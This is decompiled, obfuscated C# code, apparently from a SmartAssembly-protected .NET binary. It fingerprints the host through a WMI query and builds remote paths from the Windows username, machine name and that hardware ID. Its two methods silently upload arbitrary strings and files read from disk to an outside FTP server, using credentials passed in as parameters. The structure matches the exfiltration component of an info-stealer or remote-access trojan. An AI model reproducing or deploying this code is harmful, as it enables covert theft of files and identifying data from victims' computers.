using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ovnaSovhORzB;

internal sealed class XCKLADindvJZ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string zhDvisqDYmjg()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107476952));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107476899)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107476370);
			ManagementObject val3 = new ManagementObject(getString_0(107476365) + text2 + getString_0(107476324));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107476351)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107368539) : text;
		}
	}

	public static void iGMUTvRVUQklL(string ztBJhTQOJK = "URL", string RPGWPjdkqczI = "USERNAME", string MPEwFwQpARzkCJ = "ACCESO", string qDrjtAYvyhbq = "")
	{
		try
		{
			string text = zhDvisqDYmjg();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ztBJhTQOJK + getString_0(107478523) + Environment.UserName + getString_0(107478478) + Environment.MachineName + getString_0(107478489) + text + getString_0(107478484));
			ftpWebRequest.Method = getString_0(107476294);
			ftpWebRequest.Credentials = new NetworkCredential(RPGWPjdkqczI, MPEwFwQpARzkCJ);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(qDrjtAYvyhbq);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void nhXRXZDxbmMGwhokOT(string mzPDqelrsAzter = "URL", string ULLxArlvTJvuop = "USERNAME", string tUYQUexbZhaI = "ACCESO", string QDuGptAUehT = "")
	{
		try
		{
			string text = zhDvisqDYmjg();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(mzPDqelrsAzter + getString_0(107478523) + Environment.UserName + getString_0(107478478) + Environment.MachineName + getString_0(107478489) + text + getString_0(107478489) + Path.GetFileName(QDuGptAUehT));
			ftpWebRequest.Method = getString_0(107476294);
			ftpWebRequest.Credentials = new NetworkCredential(ULLxArlvTJvuop, tUYQUexbZhaI);
			byte[] array = File.ReadAllBytes(QDuGptAUehT);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static XCKLADindvJZ()
	{
		Strings.CreateGetStringDelegate(typeof(XCKLADindvJZ));
	}
}
